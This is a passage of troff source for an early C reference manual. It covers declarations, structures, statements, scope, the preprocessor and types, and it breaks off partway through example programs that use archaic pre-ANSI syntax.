The declarators in the declarator-list
contain the identifiers being declared.
The decl-specifiers
consist of at most one type-specifier and at most
one storage class specifier.
.dp 5
	decl-specifiers:
		type-specifier
		sc-specifier
		type-specifier sc-specifier
		sc-specifier type-specifier
.ed
8.1  Storage class specifiers
.et
The sc-specifiers are:
.dp 4
	sc-specifier:
.ft G
		auto
		static
		extern
		register
.ed
The
.bd "auto, static,"
and
.bd register
declarations also serve as definitions
in that they cause an appropriate amount of storage to be reserved.
In the \fGextern\fR case
there must be an external definition (see below)
for the given identifiers
somewhere outside the function in which they are declared.
.pg
There are some severe restrictions on
.bd register
identifiers:
there can be at most 3 register identifiers in any function,
and the type of a register identifier can only be
.bd int,
.bd char,
or pointer (not
.bd float,
.bd double,
structure, function, or array).
Also the address-of
operator
.bd &
cannot be applied to such identifiers.
.a
Except for these restrictions
(in return for which one is rewarded with faster, smaller code),
register identifiers behave as if they
were automatic.
In fact implementations of C
are free to treat
.bd register
as synonymous with
.bd auto.
.pg
If the sc-specifier is missing from a declaration, it
is generally taken to be \fGauto\fR.
.ms
8.2  Type specifiers
.et
The type-specifiers are
.dp 6
	type-specifier:
		\fGint\fR
		\fGchar\fR
		\fGfloat
		\fGdouble
		struct \fI{ type-decl-list }\fG
		struct \fIidentifier { type-decl-list }\fG
		struct \fIidentifier
.ed
The \fGstruct\fR specifier is discussed in \(sc8.5.
If the type-specifier is missing from a declaration,
it is generally taken to be \fGint\fR.
.ms
8.3  Declarators
.et
The declarator-list appearing in a declaration
is a comma-separated sequence of declarators.
.dp 2
	declarator-list:
		declarator
		declarator \fG,\fI declarator-list
.ed
The specifiers in the declaration
indicate the type and storage class of the objects to which the
declarators refer.
Declarators have the syntax:
.dp 6
	declarator:
		identifier
		\fG\**\fI declarator
		declarator \fG( )\fI
		declarator \fG[ \fIconstant-expression\*(op \fG]
		\fG( \fIdeclarator \fG)
.ed
The grouping in this definition is
the same as in expressions.
.ms
8.4  Meaning of declarators
.et
Each declarator is taken to be
an assertion that when a construction of
the same form as the declarator appears in an expression,
it yields an object of the indicated
type and storage class.
Each declarator contains exactly one identifier; it is this identifier that
is declared.
.pg
If an unadorned identifier appears
as a declarator, then it has the type
indicated by the specifier heading the declaration.
.pg
If a declarator has the form
.sp .7
	\** D
.sp .7
for D a declarator, then the
contained identifier has the type ``pointer to .^.^.'', where
``^.^.^.^'' is the type which the identifier would have had
if the declarator had been simply D.
.pg
If a declarator has the form
.sp .7
	D^(^^)
.sp .7
then the contained identifier has the type
``function returning ...'', where ``^.^.^.^'' is the
type which the identifier would have
had if the declarator had been simply D.
.pg
A declarator may have the form
.sp .7
	D[constant-expression]
.sp .3
or
.sp .3
	D[^^]
.sp .7
In the first case the constant
expression
is an expression
whose value is determinable at compile time,
and whose type is
.ft G
int.
.ft R
in the second the constant 1 is used.
(Constant expressions are defined precisely in \(sc15.)^^
Such a declarator makes the contained identifier have
type ``array.''
If the unadorned declarator D would
specify a non-array of type ``.^.^.'',
then the declarator
``D[^i^]''
yields a 1-dimensional array with rank \fIi\fR of objects
of type ``.^.^.''.
If the unadorned declarator D would
specify an \fIn^\fR-dimensional array
with rank
.ft I
i\s6\d1\u\s10^\(mu^i\s6\d2\u\s10^\(mu^.^.^.^\(mu^i\s6\dn\u\s10,
.ft R
then the declarator ``D[^i\s6\dn+1\u\s10^]''
yields an (\fIn^\fR+1^)\fR^-dimensional
array with rank
.ft I
i\s6\d1\u\s10^\(mu^i\s6\d2\u\s10^\(mu^.^.^.^\(mu^i\s6\dn\u\s10\
^\(mu^i\s6\dn+1\u\s10\fR.
.pg
An array may be constructed from one of the basic types, from a pointer,
from a structure,
or from another array (to generate a multi-dimensional array).
.pg
Finally, parentheses in declarators do not alter the type
of the contained identifier
except insofar as they alter the binding
of the components of the declarator.
.pg
Not all the possibilities
allowed by the syntax above are actually
permitted.
The restrictions are as follows:
functions may not return
arrays, structures or functions,
although they may return pointers to such things;
there are no arrays of functions, although
there may be arrays of pointers to functions.
Likewise a structure may not contain a function,
but it may contain a pointer to a function.
.pg
As an example, the declaration
.sp .7
.bG
	int i, \**ip, f^(^^), \**fip(^^), (\**pfi)^(^^);
.eG
.sp .7
declares an integer \fIi\fR,
a pointer \fIip\fR to an integer,
a function \fIf\fR returning an integer,
a function \fIfip\fR returning a pointer to an integer,
and a pointer \fIpfi\fR to a function which
returns an integer.
Also
.sp .7
.bG
	float fa[17], \**afp[17];
.eG
.sp .7
declares an array of \fGfloat\fR numbers and an array of
pointers to \fGfloat\fR numbers.
Finally,
.sp .7
.bG
	static int x3d[3][5][7];
.sp .7
.eG
declares a static three-dimensional array of integers,
with rank 3\(mu5\(mu7.
In complete detail, \fIx3d\fR is an array of three items:
each item is an array of five arrays;
each of the latter arrays is an array of seven
integers.
Any of the expressions ``x3d'', ``x3d[^i^]'', ``x3d[^i^][^j^]'', ``x3d[^i^][^j^][^k^]''
may reasonably appear in an expression.
The first three have type ``array'',
the last has type \fGint\fR.
.ms
8.5  Structure declarations
.et
Recall that one of the forms for a structure specifier
is
.dp
		\fGstruct \fI{ type-decl-list }
.ed
The
.ft I
type-decl-list
.ft R
is a sequence of type declarations for the members of the structure:
.dp 3
	type-decl-list:
		type-declaration
		type-declaration type-decl-list
.ed
A type declaration is just a declaration which does not
mention a storage class (the storage class ``member of
structure'' here being understood by context).
.dp 2
	type-declaration:
		type-specifier declarator-list  \fG;
.ed
Within the structure, the objects declared
have addresses which increase as their declarations
are read left-to-right.
Each component of a structure
begins on an addressing boundary appropriate
to its type.
On the \s8PDP\s10-11 the only requirement is that non-characters
begin on a word boundary; therefore, there may
be 1-byte, unnamed holes in a structure,
and all structures
have an even length in bytes.
.pg
Another form of structure specifier is
.dp 1
		\fGstruct \fIidentifier { type-decl-list }
.ed
This form is the same as the one just discussed,
except that the identifier is remembered
as the
.ft I
structure tag
.ft R
of the structure specified by the list.
A subsequent declaration may then be given
using the structure tag but without the list,
as in the third form of structure specifier:
.dp
		\fGstruct \fIidentifier
.ed
Structure tags allow definition of self-referential
structures; they also
permit the long part of the declaration to be
given once and used several times.
It is however absurd to declare a structure
which contains an instance of
itself, as distinct from a pointer to an instance of itself.
.pg
A simple example of a structure declaration, taken from
\(sc16.2 where its use is illustrated more fully, is
.dp 6
.bG
	struct tnode {
		char tword[20];
		int count;
		struct tnode \**left;
		struct tnode \**right;
	};
.ed
.eG
which contains an array of 20 characters, an integer, and two pointers
to similar structures.
Once this declaration has been given, the following
declaration makes sense:
.sp .7
.bG
	struct tnode s, \**sp;
.br
.eG
.sp .7
which declares
\fIs\fR to be a structure of the given sort
and \fIsp\fR to be a pointer to a structure
of the given sort.
.pg
The names of structure members and structure tags may
be the same as ordinary variables, since a distinction
can be made by context.
However, names of tags and members
must be distinct.
The same member name can appear in different
structures only if the two members are of the same type
and if their origin with respect to their structure is the
same;
thus separate structures can share a common initial segment.
-- /usr/doc/c/c4 mode=0110664 uid=3 gid=3 atime=170478273 mtime=173059629 --
.ul
9.  Statements
.et
Except as indicated, statements are executed in sequence.
.ms
9.1  Expression statement
.et
Most statements are expression statements, which have
the form
.dp 1
	expression \fG;
.ed
Usually expression statements are assignments or function
calls.
.ms
9.2  Compound statement
.et
So that several statements can be used where one is expected,
the compound statement is provided:
.dp 2
	compound-statement:
		{ statement-list }

	statement-list:
		statement
		statement statement-list
.ed
9.3  Conditional statement
.et
The two forms of the conditional statement are
.dp 2
	\fGif ( \fIexpression \fG) \fIstatement
	\fGif ( \fIexpression \fG) \fIstatement \fGelse \fIstatement
.ed
In both cases the expression is evaluated
and if it is non-zero, the first substatement
is executed.
In the second case the second substatement is executed
if the expression is 0.
As usual the ``else'' ambiguity is resolved by connecting
an \fGelse\fR with the last encountered elseless \fGif\fR.
.ms
9.4  While statement
.et
The \fGwhile\fR statement has the form
.dp 1
	\fGwhile ( \fIexpression \fG) \fIstatement
.ed
The substatement is executed repeatedly
so long as the value of the 
expression remains non-zero.
The test takes place before each execution of the
statement.
.ms
9.5  Do statement
.et
The \fGdo\fR statement has the form
.dp 1
	\fGdo \fIstatement \fGwhile ( \fIexpression \fG) ;
.ed
The substatement is executed repeatedly until
the value of the expression becomes zero.
The test takes place after each execution of the
statement.
.ms
9.6  For statement
.et
The \fGfor\fR statement has the form
.dp 1
.ft G
	for ( \fIexpression-1\*(op \fG; \fIexpression-2\*(op \fG ; \c
\fIexpression-3\*(op \fG) \fIstatement
.ed
This statement is equivalent to
.dp 5
	expression-1;
	\fGwhile (\fI^expression-2\fG^) {
		\fIstatement
		expression-3^\fG;
	}
.ed
Thus the first expression specifies initialization
for the loop; the second specifies
a test, made before each iteration, such
that the loop is exited when the expression becomes
0;
the third expression typically specifies an incrementation
which is performed after each iteration.
.pg
Any or all of the expressions may be dropped.
A missing
.ft I
expression-2
.ft R
makes the
implied \fGwhile\fR clause equivalent to ``while(^1^)'';
other missing expressions are simply
dropped from the expansion above.
.ms
9.7  Switch statement
.et
The \fGswitch\fR statement causes control to be transferred
to one of several statements depending on
the value of an expression.
It has the form
.dp 1
	\fGswitch ( \fIexpression \fG) \fIstatement
.ed
The expression must be \fGint\fR or \fGchar\fR.
The statement is typically compound.
Each statement within the statement
may be labelled with case prefixes
as follows:
.dp 1
	\fGcase \fIconstant-expression \fG:
.ed
where the constant
expression
must be \fGint\fR or \fGchar\fR.
No two of the case constants in a switch
may have the same value.
Constant expressions are precisely defined in \(sc15.
.pg
There may also be at most one statement prefix of the
form
.dp 1
	\fGdefault :
.ed
When the \fGswitch\fR statement is executed, its expression
is evaluated and compared with each case constant in
an undefined order.
If one of the case constants is
equal to the value of the expression,
control is passed to the statement
following the matched case prefix.
If no case constant matches the expression,
and if there is a \fGdefault\fR prefix, control
passes to the prefixed
statement.
In the absence of a \fGdefault\fR prefix
none of the statements in the
switch is executed.
.pg
Case or default prefixes in themselves
do not alter the flow of control.
.ms
9.8  Break statement
.et
The statement
.dp 1
	\fGbreak ;
.ed
causes termination of the smallest enclosing \fGwhile\fR, \fGdo\fR,
\fGfor\fR, or \fGswitch\fR statement;
control passes to the
statement following the terminated statement.
.ms
9.9  Continue statement
.et
The statement
.dp 1
	\fGcontinue ;
.ed
causes control to pass to the loop-continuation portion of the
smallest enclosing \fGwhile\fR,
\fGdo\fR, or \fGfor\fR
statement; that is to the end of the loop.
More precisely, in each of the statements
.dp 4
.bG
.ta .5i 2.5i 4.5i
	while (^^.^.^.^^) {	do {	for (^^.^.^.^^) {
	  ^.^.^.^	  ^.^.^.^	  ^.^.^.^
	contin:^;	contin:^;	contin:^;
	}	} while (^^.^.^.^^)^;	}
.ed
.eG
.ta .5i 1i 1.5i 2i 2.5i 3i
a \fGcontinue\fR is equivalent to ``goto contin''.
.ms
9.10  Return statement
.et
A function returns to its caller by means of
the \fGreturn\fR statement, which has one of the
forms
.dp 2
.ft G
	return ;
	return ( \fIexpression \fG) ;
.ed
In the first case no value is returned.
In the second case, the value of the expression
is returned to the caller
of the function.
If required, the expression is converted,
as if by assignment, to the type of the
function in which it appears.
Flowing off the end of a function is
equivalent to a return with no returned value.
.ms
9.11  Goto statement
.et
Control may be transferred unconditionally by means of
the statement
.dp 1
.ft G
	goto \fIexpression \fG;
.ed
The expression should be a label (\(sc\(sc9.12, 14.4)
or an expression of type ``pointer to \fGint\fR''
which evaluates to a label.
It is illegal to transfer to a label
not located in the current function
unless some extra-language provision
has been made to adjust
the stack correctly.
.ms
9.12  Labelled statement
.et
Any statement may be preceded by
label prefixes of the form
.dp 1
	identifier \fG:
.ed
which serve to declare the identifier
as a label.
More details on the semantics of labels are
given in \(sc14.4 below.
.ms
9.13  Null statement
.et
The null statement has the form
.dp 1
	\fG;
.ed
A null statement is useful to carry a label just before the ``}''
of a compound statement or to supply a null
body to a looping statement such as \fGwhile\fR.
-- /usr/doc/c/c5 mode=0110664 uid=3 gid=3 atime=170478275 mtime=173059629 --
.ul
10. External definitions
.et
A C program consists of a sequence of external definitions.
External definitions may be given for functions, for
simple variables, and for arrays.
They are used both to declare and to reserve storage for
objects.
An external definition declares an identifier to
have storage class \fGextern\fR and
a specified type.
The type-specifier (\(sc8.2) may be empty, in which
case the type is taken to be \fGint\fR.
.ms
10.1  External function definitions
.et
Function definitions have the form
.dp 2
.ta .5i 1i 1.5i 2i 2.5i
	function-definition:
		type-specifier\*(op function-declarator function-body
.ed
A function declarator is similar to a declarator
for a ``function returning ...'' except that
it lists the formal parameters of
the function being defined.
.dp 2
	function-declarator:
		declarator \fG( \fIparameter-list\*(op \fG)

.ft I
	parameter-list:
		identifier
		identifier \fG,\fI parameter-list
.ed
The function-body
has the form
.dp 1
	function-body:
		type-decl-list function-statement
.ed
The purpose of the
type-decl-list is to give the types of the formal parameters.
No other identifiers should be declared in this list, and formal
parameters should be declared only here.
.pg
The function-statement
is just a compound
statement which may have
declarations at the start.
.dp 2
	function-statement:
		{ declaration-list\*(op statement-list }
.ed
A simple example of a complete function definition is
.sp .7
.ne 7
.nf
.bG
	int max^(^a, b, c)
	int a, b, c;
	{
		int m;
		m = ^(^a^>^b^)? a^:^b^;
		return^(^m^>^c? m^:^c^)^;
	}
.sp .7
.eG
.fi
Here ``int'' is the type-specifier;
``max(a,@b,@c)'' is the function-declarator;
``int@a,@b,@c;'' is the type-decl-list for
the formal
parameters;
``{@.^.^.@}'' is the function-statement.
.pg
C converts all
\fGfloat\fR actual parameters
to \fGdouble\fR, so formal parameters declared \fGfloat\fR
have their declaration adjusted to read \fGdouble\fR.
Also, since a reference to an array in any context
(in particular as an actual parameter)
is taken to mean
a pointer to the first element of the array,
declarations of formal parameters declared ``array of ...''
are adjusted to read ``pointer to ...''.
Finally, because neither structures
nor functions can be passed
to a function, it is useless to declare
a formal parameter to be a structure or
function (pointers to structures or
functions are of course permitted).
.pg
A free \fGreturn\fR statement is supplied at the
end of each function definition, so
running off the end
causes
control, but no value, to be returned to
the caller.
.ms
10.2  External data definitions
.et
An external data definition has the form
.dp 2
	data-definition:
		\fGextern\*(op \fItype-specifier\*(op init-declarator-list\*(op \fG;
.ed
The optional
.ft G
extern
.ft R
specifier is discussed in \(sc 11.2.
If given, the init-declarator-list is a
comma-separated list of declarators each of which may be
followed by an initializer for the declarator.
.dp 2
	init-declarator-list:
		init-declarator
		init-declarator \fG, \fIinit-declarator-list
.ed
.dp 2
	init-declarator:
		declarator initializer\*(op
.ed
Each initializer represents the initial value for the
corresponding object
being defined (and declared).
.dp 5
	initializer:
		constant
		{ constant-expression-list }
.ed
.dp 3
	constant-expression-list:
		constant-expression
		constant-expression \fG,\fI constant-expression-list
.ed
Thus an initializer consists of
a constant-valued expression, or
comma-separated list of expressions,
inside braces.
The braces may be dropped
when the expression is just a plain
constant.
The exact meaning of a constant expression is discussed
in \(sc15.
The expression list is used to initialize arrays;
see below.
.pg
The type of the identifier being
defined
should be compatible
with the type of the initializer:
a \fGdouble\fR constant
may initialize a \fGfloat\fR or \fGdouble\fR identifier;
a non-floating-point expression
may
initialize an \fGint\fR, \fGchar\fR, or pointer.
.pg
An initializer for an array may contain
a comma-separated list of compile-time expressions.
The length of the array is taken to be the
maximum of the number of expressions in the list
and the square-bracketed constant in the
array's declarator.
This constant may be missing,
in which case 1 is used.
The expressions initialize successive members of the array
starting at the origin (subscript 0)
of the array.
The acceptable expressions for an array of type
``array of ...'' are the same as
those for type ``...''.
As a special case, a single
string may be given as the initializer
for an array of \fGchar\fRs; in this case,
the characters in the string are taken
as the initializing values.
.pg
Structures can be initialized, but this operation
is incompletely implemented and machine-dependent.
Basically the structure is regarded as a sequence
of words and the initializers are placed into those
words.
Structure initialization,
using a comma-separated list in braces,
is safe if all the members of the structure
are integers or pointers but is otherwise ill-advised.
.pg
The initial value of any externally-defined
object not explicitly initialized is guaranteed
to be 0.
.ul
11.  Scope rules
.et
A complete C program need not all
be compiled at the same time: the source text of the
program
may be kept in several files, and precompiled
routines may be loaded from
libraries.
Communication among the functions of a program
may be carried out both through explicit calls
and through manipulation of external data.
.pg
Therefore, there are two kinds of scope to consider:
first, what may be called the \fIlexical scope\fR
of an identifier, which is essentially the
region of a program during which it may
be used without drawing ``undefined identifier''
diagnostics;
and second, the scope
associated with external identifiers,
which is characterized by the rule
that references to the same external
identifier are references to the same object.
.ms
11.1  Lexical scope
.et
C is not a block-structured language;
this may fairly be considered a defect.
The lexical scope of names declared in external definitions
extends from their definition through
the end of the file
in which they appear.
The lexical scope of names declared at the head of functions
(either as formal parameters
or in the declarations heading the
statements constituting the function itself)
is the body of the function.
.pg
It is an error to redeclare identifiers already
declared in the current context,
unless the new declaration specifies the same type
and storage class as already possessed by the identifiers.
.ms
11.2  Scope of externals
.et
If a function declares an identifier to be
\fGextern\fR,
then somewhere among the files or libraries
constituting the complete program
there must be an external definition
for the identifier.
All functions in a given program which refer to the same
external identifier refer to the same object,
so care must be taken that the type and extent
specified in the definition
are compatible with those specified
by each function which references the data.
.pg
In \s8PDP\s10-11 C,
it is explicitly permitted for (compatible)
external definitions of the same identifier
to be present in several of the
separately-compiled pieces of a complete program,
or even twice within the same program file,
with the important limitation that the identifier
may be initialized in at most one of the
definitions.
In other operating systems, however, the compiler must know
in just which file the storage
for the identifier is allocated, and in which file
the identifier is merely being referred to.
In the implementations of C for such systems,
the appearance of the
.ft G
extern
.ft R
keyword before an external definition
indicates that storage for the identifiers
being declared
will be allocated in another file.
Thus in a multi-file program,
an external data definition without
the
.ft G
extern
.ft R
specifier must appear in exactly one of the files.
Any other files which wish to give an external definition
for the identifier must
include the
.ft G
extern
.ft R
in the definition.
The identifier can be initialized only in the file
where storage is allocated.
.pg
In \s8PDP\s10-11 C none of this nonsense is necessary
and the
.ft G
extern
.ft R
specifier is ignored in external definitions.
.ul
12.  Compiler control lines
.et
When a line of a C program begins
with the character \fG#\fR, it is interpreted not by
the compiler itself, but by a preprocessor which is capable
of replacing instances of given identifiers
with arbitrary token-strings and of inserting
named files into the source program.
In order to cause this preprocessor to be invoked, it
is necessary that the very first line of the program
begin with \fG#\fR.
Since null lines are ignored by the preprocessor,
this line need contain no other information.
.ms
12.1  Token replacement
.et
A compiler-control line of the form
.dp 1
	\fG# define \fIidentifier token-string
.ed
(note: no trailing semicolon)
causes the preprocessor to replace subsequent instances
of the identifier with the given string of tokens
(except within compiler control lines).
The replacement token-string has comments removed from
it, and it is surrounded with blanks.
No rescanning of the replacement string is attempted.
This facility is most valuable for definition of ``manifest constants'',
as in
.sp .7
.nf
.bG
	# define tabsize 100
	.^.^.
	int table[tabsize];
.sp .7
.eG
.fi
.ms
12.2  File inclusion
.et
Large C programs
often contain many external data definitions.
Since the lexical scope of external definitions
extends to the end of the program file,
it is good practice
to put all the external definitions for
data at the start of the
program file, so that the functions defined within
the file need not repeat tedious and error-prone
declarations for each external identifier they use.
It is also useful to put a heavily used structure definition
at the start and use its structure tag to declare
the \fGauto\fR pointers to the structure
used within functions.
To further exploit
this technique when a large C program
consists of several files, a compiler control line of
the form
.dp 1
	\fG# include "\fIfilename^\fG"
.ed
results in the replacement of that
line by the entire contents of the file
\fIfilename\fR.
.pg
.ul
13.  Implicit declarations
.et
It is not always necessary to specify
both the storage class and the type
of identifiers in a declaration.
Sometimes the storage class is supplied by
the context: in external definitions,
and in declarations of formal parameters
and structure members.
In a declaration inside a function,
if a storage class but no type
is given, the identifier is assumed
to be \fGint\fR;
if a type but no storage class is indicated,
the identifier is assumed to
be \fGauto\fR.
An exception to the latter rule is made for
functions, since \fGauto\fR functions are mean$ing$less
(C being incapable of compiling code into the stack).
If the type of an identifier is ``function returning ...'',
it is implicitly declared to be \fGextern\fR.
.pg
In an expression, an identifier
followed by \fG(\fR and not currently declared
is contextually
declared to be ``function returning \fGint\fR''.
.pg
Undefined identifiers not followed by \fG(\fR
are assumed to be labels which
will be defined later in the function.
(Since a label is not an lvalue, this accounts
for the ``Lvalue required'' error
message
sometimes noticed when
an undeclared identifier is used.)
Naturally, appearance of
an identifier as a label declares it as such.
.pg
For some purposes it is best to consider formal
parameters as belonging to their own storage class.
In practice, C treats parameters as if they
were automatic (except that, as mentioned
above, formal parameter arrays and \fGfloat\fRs
are treated specially).
.ul
14.  Types revisited
.et
This section summarizes the operations
which can be performed on objects of certain types.
.ms
14.1  Structures
.et
There are only two things that can be done with
a structure:
pick out one of its members (by means of the
\fG^.^\fR or \fG\(mi>\fR operators); or take its address (by unary \fG&\fR).
Other operations, such as assigning from or to
it or passing it as a parameter, draw an
error message.
In the future, it is expected that
these operations, but not necessarily
others, will be allowed.
.ms
14.2  Functions
.et
There are only two things that
can be done with a function:
call it, or take its address.
If the name of a function appears in an
expression not in the function-name position of a call,
a pointer to the function is generated.
Thus, to pass one function to another, one
might say
.bG
.sp .7
.nf
	int f(^^);
	...
	g(^f^);
.sp .7
.eG
.ft R
Then the definition of \fIg \fRmight read
.sp .7
.bG
	g^(^funcp^)
	int (\**funcp)^(^^);
	{
		.^.^.
		(\**funcp)^(^^);
		.^.^.
	}
.sp .7
.eG
.fi
Notice that \fIf\fR was declared
explicitly in the calling routine since its first appearance
was not followed by \fG(\fR^.
.ms
14.3  Arrays, pointers, and subscripting
.et
Every time an identifier of array type appears
in an expression, it is converted into a pointer
to the first member of the array.
Because of this conversion, arrays are not
lvalues.
By definition, the subscript operator
\fG[^]\fR is interpreted
in such a way that
``E1[E2]'' is identical to
``\**(^(^E1)^+^(E2^)^)''.
Because of the conversion rules
which apply to \fG+\fR, if E1 is an array and E2 an integer,
then E1[E2] refers to the E2-th member of E1.
Therefore,
despite its asymmetric
appearance, subscripting is a commutative operation.
.pg
A consistent rule is followed in the case of
multi-dimensional arrays.
If E is an \fIn^\fR-dimensional
array
of rank
.ft I
i^\(mu^j^\(mu^.^.^.^\(muk,
.ft R
then E appearing in an expression is converted to
a pointer to an (\fIn\fR\(mi1)-dimensional
array with rank
.ft I
j^\(mu^.^.^.^\(muk.
.ft R
If the \fG\**\fR operator, either explicitly
or implicitly as a result of subscripting,
is applied to this pointer,
the result is the pointed-to (\fIn\fR\(mi1)-dimensional array,
which itself is immediately converted into a pointer.
.pg
For example, consider
.sp .7
.bG
	int x[3][5];
.sp .7
.eG
Here \fIx\fR is a 3\(mu5 array of integers.
When \fIx\fR appears in an expression, it is converted
to a pointer to (the first of three) 5-membered arrays of integers.
In the expression ``x[^i^]'',
which is equivalent to ``\**(x+i)'',
\fIx\fR is first converted to a pointer as described;
then \fIi\fR is converted to the type of \fIx\fR,
which involves multiplying \fIi\fR by the
length the object to which the pointer points,
namely 5 integer objects.
The results are added and indirection applied to
yield an array (of 5 integers) which in turn is converted to
a pointer to the first of the integers.
If there is another subscript the same argument applies
again; this time the result is an integer.
.pg
It follows from all this that arrays in C are stored
row-wise (last subscript varies fastest)
and that the first subscript in the declaration helps determine
the amount of storage consumed by an array
but plays no other part in subscript calculations.
.ms
14.4  Labels
.et
Labels do not
have a type of their own; they are
treated
as having type ``array of \fGint\fR''.
Label variables should be declared ``pointer
to \fGint\fR'';
before execution of a \fGgoto\fR referring to the
variable,
a label (or an expression
deriving from a label) should be assigned to the
variable.
.pg
Label variables are a bad idea in general;
the \fGswitch\fR statement makes them
almost always unnecessary.
.ul
15.  Constant expressions
.et
In several places C requires expressions which evaluate to
a constant:
after
.ft G
case,
.ft R
as array bounds, and in initializers.
In the first two cases, the expression can
involve only integer constants, character constants,
and
.ft G
sizeof
.ft R
expressions, possibly
connected by the binary operators
.tr ^^
.dp
	+   \(mi   \**   /   %   &   \(or   ^   <<   >>
.ed
or by the unary operators
.dp
	\(mi   \*~
.ed
.tr ^\|
Parentheses can be used for grouping,
but not for function calls.
.pg
A bit more latitude is permitted for initializers;
besides constant expressions as discussed above,
one can also apply the unary \fG&\fR
operator to external scalars,
and to external arrays subscripted
with a constant expression.
The unary \fG&\fR can also
be applied implicitly
by appearance of unsubscripted external arrays.
The rule here is that initializers must
evaluate either to a constant or to the address
of an external identifier plus or minus a constant.
-- /usr/doc/c/c6 mode=0110664 uid=3 gid=3 atime=170478276 mtime=173059629 --
.ul
16.  Examples.
.et
These examples are intended to illustrate
some typical C constructions as well as
a serviceable style of writing C programs.
.ms
16.1  Inner product
.et
This function returns the inner product of
its array arguments.
.sp .7
.nf
.bG
	double inner^(^v1, v2, n^)^
	double v1^[^^]^, v2^[^^]^;
	{
		double sum^;
		int i^;
		sum = 0.0^;
		for ^(^i=0^; i<n^; i\fR++\fG^)^
			sum \fR=+\fG v1^[^i^] \** v2^[^i^]^;
		return^(^sum^)^;
	}
.fi
.eG
.sp .7
The following version is somewhat more efficient,
but perhaps a little less clear.
It uses the facts that parameter arrays are
really pointers, and that all parameters are passed
by value.
.sp .7
.nf
.bG
	double inner^(^v1, v2, n^)^
	double \**v1, \**v2^;
	{
		double sum^;
		sum = 0.0^;
		while^(^n\fR\fR\(mi\(mi\fG\fG^)^
			sum \fR=+\fG \**v1\fR++\fG  \**  \**v2\fR++\fG^;
		return^(^sum^)^;
	}
.fi
.eG
.sp .7
The declarations for the parameters are really exactly
the same as in the last example.
In the first case array declarations ``^[^^^]^'' were given
to emphasize that the parameters would be referred
to as arrays; in the second, pointer declarations
were given because the indirection operator and
++ were used.
.ms
16.2  Tree and character processing
.et
Here is a complete C program
^(^courtesy of R. Haight^)^ which reads a document
and produces an alphabetized list of words
found therein together with
the number of occurrences of each word.
The method keeps a binary tree of words
such that the left descendant tree for
each word has all the words lexicographically smaller than
the given word,
and the right descendant has all the larger
words.
Both the insertion and the printing routine
are recursive.
.pg
The program calls the library routines \fIgetchar\fR to
pick up characters
and \fIexit\fR to terminate execution.
\fIPrintf\fR is called to print
the results according to a format
string.
A version of
\fIprintf\fR is given below ^(^\(sc16.3^)^.
.pg
Because all the external definitions for
data are given at the top, no \fGextern\fR
declarations are necessary within the functions.
To stay within the rules, a type declaration
is given for each non-integer function
when the function is used before
it is defined.
However, since all such
functions return pointers which are
simply assigned to other pointers,
no actual harm would result from
leaving out the declarations; the
supposedly \fGint\fR function values would be assigned
without error or complaint.
.sp .7
.nf
.in .5i
.bG
.ta .5i 1i 3i
# define nwords 100	/\** number of different words \**/
# define wsize 20	/\** max chars per word \**/
struct tnode {		/\** the basic structure \**/
	char tword^[^wsize^]^;
	int count^;
	struct tnode \**left^;
	struct tnode \**right^;
}^;
.sp .7
struct tnode space^[^nwords^]^;	/\** the words themselves \**/
int nnodes nwords^;	/\** number of remaining slots \**/
struct tnode \**spacep space^;	/\** next available slot \**/
struct tnode \**freep^;	/\** free list \**/
/\**
 \** The main routine reads words until end-of-file \
^(^\(aa\\0\(aa returned from "getchar"^)^
 \** "tree" is called to sort each word into the tree.
 \**/
.ta .5i 1i 1.5i 2i 2.5i 3i
main^(^^)^
{
	struct tnode \**top, \**tree^(^^)^;
	char c, word^[^wsize^]^;
	int i^;
.sp .5
	i = top = 0^;
	while ^(^c=getchar^(^^)^^)^
		if ^(^\(aaa\(aa<=c && c<=\(aaz\(aa \(or\(or \(aaA\(aa<=c && c <=\(aaZ\(aa^)^ {
			if ^(^i<wsize\(mi1^)^
				word^[^i\fR++\fG^]^ = c^;
		} else
			if ^(^i^)^ {
				word^[^i\fR++\fG^]^ = \(aa\\0\(aa^;
				top = tree^(^top, word^)^;
				i = 0^;
			}
	tprint^(^top^)^;
}
/\**
 \** The central routine.  If the subtree pointer is null, \
allocate a new node for it.
 \** If the new word and the node\(aas word are the same, increase \
the node\(aas count.
 \** Otherwise, recursively sort the word into the left or right subtree according
 \** as the argument word is less or greater \
than the node\(aas word.
 \**/
struct tnode \**tree^(^p, word^)^
struct tnode \**p^;
char word^[^^]^;
{
	struct tnode \**alloc^(^^)^;
	int cond^;
.sp .5
	/\** Is pointer null? \**/
	if ^(^p\fR==\fG0^)^ {
		p = alloc^(^^)^;
		copy^(^word, p\(mi>tword^)^;
		p\(mi>count = 1^;
		p\(mi>right = p\(mi>left = 0^;
		return^(^p^)^;
	}
	/\** Is word repeated? \**/
	if ^(^^(^cond=compar^(^p\(mi>tword, word^)^^)^ \fR==\fG 0^)^ {
		p\(mi>count\fR++\fG^;
		return^(^p^)^;
	}
	/\** Sort into left or right \**/
	if ^(^cond<0^)^
		p\(mi>left = tree^(^p\(mi>left, word^)^;
	else
		p\(mi>right = tree^(^p\(mi>right, word^)^;
	return^(^p^)^;
}
/\**
 \** Print the tree by printing the left subtree, the \
given node, and the right subtree.
 \**/
tprint^(^p^)^
struct tnode \**p^;
{
	while ^(^p^)^ {
		tprint^(^p\(mi>left^)^;
		printf^(^"%d:  %s\\n", p\(mi>count, p\(mi>tword^)^;
		p = p\(mi>right^;
	}
}
/\**
 \** String comparison: return number ^(^>, =, <^)^ 0
 \** according as s1 ^(^>, =, <^)^ s2.
 \**/
compar^(^s1, s2^)^
char \**s1, \**s2^;
{
	int c1, c2^;
.sp .5
	while^(^^(^c1 = \**s1\fR++\fG^)^ \fR==\fG ^(^c2 = \**s2\fR++\fG^)^^)^
		if ^(^c1\fR==\fG\(aa\\0\(aa^)^
			return^(^0^)^;
	return^(^c2\(mic1^)^;
}
/\**
 \** String copy: copy s1 into s2 until the null
 \** character appears.
 \**/
copy^(^s1, s2^)^
char \**s1, \**s2^;
{
	while^(^\**s2\fR++\fG = \**s1\fR++\fG^)^;
}
/\**
 \** Node allocation: return pointer to a free node.
 \** Bomb out when all are gone.  Just for fun, there
 \** is a mechanism for using nodes that have been
 \** freed, even though no one here calls "free."
 \**/
struct tnode \**alloc^(^^)^
{
	struct tnode \**t^;
.sp .5
	if ^(^freep^)^ {
		t = freep^;
		freep = freep\(mi>left^;
		return^(^t^)^;
	}
	if ^(^\fR\(mi\(mi\fGnnodes < 0^)^ {
		printf^(^"Out of space\\n"^)^;
		exit^(^^)^;
	}
	return^(^spacep\fR++\fG^)^;
}
/\**
